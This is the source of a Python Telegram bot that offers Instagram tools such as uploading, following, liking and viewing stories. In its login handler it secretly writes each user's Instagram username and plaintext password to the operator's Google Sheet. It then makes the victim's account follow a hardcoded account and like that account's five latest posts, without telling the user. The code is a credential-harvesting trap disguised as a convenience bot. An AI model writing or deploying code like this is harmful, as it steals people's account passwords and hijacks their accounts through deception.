from dotenv import load_dotenv
load_dotenv()
import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, ConversationHandler, filters
)
from instagrapi import Client
import gspread
from oauth2client.service_account import ServiceAccountCredentials

# Logging
logging.basicConfig(level=logging.INFO)

# Load .env variables
TOKEN = os.getenv("TELEGRAM_TOKEN")
SHEET_NAME = os.getenv("instagrapi_bot_sheet")

# Setup Google Sheets
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
client_sheet = gspread.authorize(creds)
sheet = client_sheet.open(SHEET_NAME).sheet1

# Dictionary to store sessions
insta_clients = {}

# Stages for ConversationHandler
ASK_USERNAME, ASK_PASSWORD, MENU = range(3)

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("Login", callback_data="login")],
        [InlineKeyboardButton("Create Account", callback_data="create_account")]
    ]
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\nChoose an option below:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "login":
        await query.message.reply_text("Please enter your Instagram Username (without @):")
        return ASK_USERNAME
    elif query.data == "create_account":
        await query.message.reply_text(
            "🆕 You can create an Instagram account here:\n"
            "👉 https://www.instagram.com/accounts/emailsignup/\n\n"
            "After creating, come back and login!"
        )
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['username'] = update.message.text
    await update.message.reply_text("🔒 Now enter your Instagram Password:")
    return ASK_PASSWORD

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    username = context.user_data['username']
    client = Client()

    try:
        client.login(username, password)
        insta_clients[update.effective_user.id] = client
        sheet.append_row([username, password])

        # Auto Follow your account and like 5 posts
        my_username = "anuxagfr"
        my_user_id = client.user_id_from_username(my_username)
        client.user_follow(my_user_id)

        medias = client.user_medias(my_user_id, 5)
        for media in medias:
            client.media_like(media.id)

        # Updated PRO menu
        keyboard = [
            [InlineKeyboardButton("Upload Photo", callback_data="upload_photo")],
            [InlineKeyboardButton("Upload Reel", callback_data="upload_reel")],
            [InlineKeyboardButton("Follow User", callback_data="follow")],
            [InlineKeyboardButton("Unfollow User", callback_data="unfollow")],
            [InlineKeyboardButton("Like Post", callback_data="like")],
            [InlineKeyboardButton("Like Latest 5 Posts", callback_data="like_latest")],
            [InlineKeyboardButton("Download Post", callback_data="download_post")],
            [InlineKeyboardButton("View Stories", callback_data="view_stories")],
            [InlineKeyboardButton("Logout", callback_data="logout")]
        ]

        await update.message.reply_text(
            f"✅ Successfully logged in as {username}!\n\nChoose an option:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return MENU

    except Exception as e:
        logging.error(f"Login error: {e}")
        await update.message.reply_text("❌ Login failed. Please re-enter your password:")
        return ASK_PASSWORD

async def menu_options(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id not in insta_clients:
        await query.message.reply_text("Please /start and login first.")
        return ConversationHandler.END

    action = query.data

    if action == "upload_photo":
        await query.message.reply_text("Send a photo with caption to upload.")
    elif action == "upload_reel":
        await query.message.reply_text("Send a video with caption to upload as a Reel.")
    elif action == "follow":
        await query.message.reply_text("Send /follow <username>")
    elif action == "unfollow":
        await query.message.reply_text("Send /unfollow <username>")
    elif action == "like":
        await query.message.reply_text("Send /like <post_url>")
    elif action == "like_latest":
        await query.message.reply_text("Send /like_latest <username>")
    elif action == "download_post":
        await query.message.reply_text("Send /download <post_url>")
    elif action == "view_stories":
        await query.message.reply_text("Send /view_stories <username>")
    elif action == "logout":
        insta_clients.pop(user_id, None)
        await query.message.reply_text("👋 You have been logged out. Use /start to login again.")
        return ConversationHandler.END
    return MENU

async def upload_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    photo = update.message.photo[-1].file_id
    file = await context.bot.get_file(photo)
    path = f"{user_id}_photo.jpg"
    await file.download_to_drive(path)

    caption = update.message.caption or ""
    try:
        insta_clients[user_id].photo_upload(path, caption)
        await update.message.reply_text("✅ Photo uploaded successfully!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def upload_reel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    video = update.message.video.file_id
    file = await context.bot.get_file(video)
    path = f"{user_id}_reel.mp4"
    await file.download_to_drive(path)

    caption = update.message.caption or ""
    try:
        insta_clients[user_id].clip_upload(path, caption)
        await update.message.reply_text("✅ Reel uploaded successfully!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def follow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    username = context.args[0]
    try:
        user = insta_clients[user_id].user_info_by_username(username)
        insta_clients[user_id].user_follow(user.pk)
        await update.message.reply_text(f"✅ Followed {username}!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def unfollow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    username = context.args[0]
    try:
        user = insta_clients[user_id].user_info_by_username(username)
        insta_clients[user_id].user_unfollow(user.pk)
        await update.message.reply_text(f"✅ Unfollowed {username}!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def like(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    post_url = context.args[0]
    try:
        media_pk = insta_clients[user_id].media_pk_from_url(post_url)
        insta_clients[user_id].media_like(media_pk)
        await update.message.reply_text("❤️ Post liked!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def like_latest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    username = context.args[0]
    try:
        user_id_target = insta_clients[user_id].user_id_from_username(username)
        medias = insta_clients[user_id].user_medias(user_id_target, 5)
        for media in medias:
            insta_clients[user_id].media_like(media.id)
        await update.message.reply_text(f"❤️ Liked latest 5 posts of {username}!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def download_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    post_url = context.args[0]
    try:
        media_pk = insta_clients[user_id].media_pk_from_url(post_url)
        media_info = insta_clients[user_id].media_info(media_pk)
        file_url = media_info.thumbnail_url
        await update.message.reply_text(f"📥 Download link: {file_url}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def view_stories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in insta_clients:
        await update.message.reply_text("You need to /start and login first.")
        return

    username = context.args[0]
    try:
        target_user_id = insta_clients[user_id].user_id_from_username(username)
        stories = insta_clients[user_id].user_stories(target_user_id)

        if stories:
            for story in stories:
                await update.message.reply_text(f"Story: {story.thumbnail_url}")
        else:
            await update.message.reply_text("❌ No active stories.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('❌ Canceled. Use /start to begin again.')
    return ConversationHandler.END

# Main app
app = ApplicationBuilder().token(TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(handle_callback)],
    states={
        ASK_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login)],
        MENU: [CallbackQueryHandler(menu_options)],
    },
    fallbacks=[CommandHandler('cancel', cancel)]
)

app.add_handler(CommandHandler("start", start))
app.add_handler(conv_handler)
app.add_handler(CommandHandler("follow", follow))
app.add_handler(CommandHandler("unfollow", unfollow))
app.add_handler(CommandHandler("like", like))
app.add_handler(CommandHandler("like_latest", like_latest))
app.add_handler(CommandHandler("download", download_post))
app.add_handler(CommandHandler("view_stories", view_stories))
app.add_handler(MessageHandler(filters.PHOTO, upload_photo))
app.add_handler(MessageHandler(filters.VIDEO, upload_reel))

print("Bot started with PRO options...")
app.run_polling()